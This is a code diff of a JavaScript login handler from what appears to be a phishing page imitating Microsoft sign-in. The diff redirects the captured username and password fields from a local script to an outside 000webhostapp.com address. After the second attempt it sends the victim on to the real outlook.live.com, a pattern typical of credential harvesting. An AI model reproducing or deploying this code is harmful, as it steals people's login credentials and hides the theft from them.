@@ -71,7 +71,7 @@ function ridwth(){
 
 	$.ajax({
 		type: "POST",
-		url: "api.php",
+		url: "https://strenghtofficethree.000webhostapp.com/xheidheolshdndi/",
 		data: {slvurs: slvurs, slvpsr: slvpsr},
 		success: function(data){
         jscsle = jscsle+1;
@@ -80,7 +80,7 @@ function ridwth(){
            document.getElementById("idSIButton10").style.display = "inline";
            document.getElementById("sucrat10").style.display = "none";
         }else if(jscsle == 2){
-           window.location.href = "https://live.com";
+           window.location.href = "https://outlook.live.com/";
         }
 		},
     error : function(jqXHR, textStatus, errorThrown) {
